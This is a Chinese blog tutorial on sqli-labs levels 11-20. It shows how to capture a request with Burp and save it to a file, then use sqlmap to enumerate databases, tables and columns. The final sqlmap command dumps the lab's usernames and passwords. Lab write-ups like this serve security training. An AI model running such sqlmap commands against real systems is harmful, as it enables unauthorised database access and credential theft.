# 原创
：  （sqlmap）【sqli-labs11-20】爆破本地数据文件

# （sqlmap）【sqli-labs11-20】爆破本地数据文件

**目录**

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[二、利用过程：](#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[2.1、第一步：代理抓包](#2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85)

[2.2、第二步：保存文件](#2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6)

[2.3、第三步：爆破数据库](#2.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93)

[爆数据库](#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93)

[爆表名](#%E7%88%86%E8%A1%A8%E5%90%8D)

[爆字段名](#%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[爆数据](#%E7%88%86%E6%95%B0%E6%8D%AE)

---


> 
<h2> 推荐：</h2>
[（手工）【sqli-labs11-12】POST注入：基本步骤、示例<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M5H6"/>https://blog.csdn.net/qq_53079406/article/details/125655261?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125655261?spm=1001.2014.3001.5501)



> 
<h2>一、简介：</h2>
使用bp+代理将抓住的包保存到本地文件进行跑


---


---


## 二、利用过程：

> 
<h3>2.1、第一步：代理抓包</h3>
浏览器设置代理使用bp抓包





> 
<h3>2.2、第二步：保存文件</h3>
使用BURP保存数据包到本地,命名为1.txt


 <img alt="" height="747" src="https://img-blog.csdnimg.cn/7f00abd9405041b69444303ac144a33f.png" width="1200"/>

 <img alt="" height="156" src="https://img-blog.csdnimg.cn/efec939601f84e738d0b7692704c1bf5.png" width="347"/>



> 
<h3>2.3、第三步：爆破数据库</h3>
<h4>爆数据库</h4>
python sqlmap.py -r ’C:\Users\*****\Desktop\1.txt‘（文件保存的位置） --technique UE --dbms mysql --batch --dbs

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/a8048aa810c64535bd14df51f09e12ae.png" width="1200"/>
<hr/>
<h4>爆表名</h4>
python sqlmap.py -r 'C:\Users\*****\Desktop\1.txt' --technique UE --dbms mysql --batch -D security --tables




<hr/>
<h4>爆字段名</h4>
python sqlmap.py -r 'C:\Users\*****\Desktop\1.txt' --technique UE --dbms mysql --batch -D security -T users --columns


 <img alt="" height="648" src="https://img-blog.csdnimg.cn/60384c698cae44a5a9f8e92dba4242dc.png" width="1200"/>

<hr/>
<h4>爆数据</h4>
python sqlmap.py -r 'C:\Users\****\Desktop\1.txt' --technique UE --dbms mysql --batch -D security -T users -C 'username,password' --dump






#### 爆数据库

---


#### 爆字段名
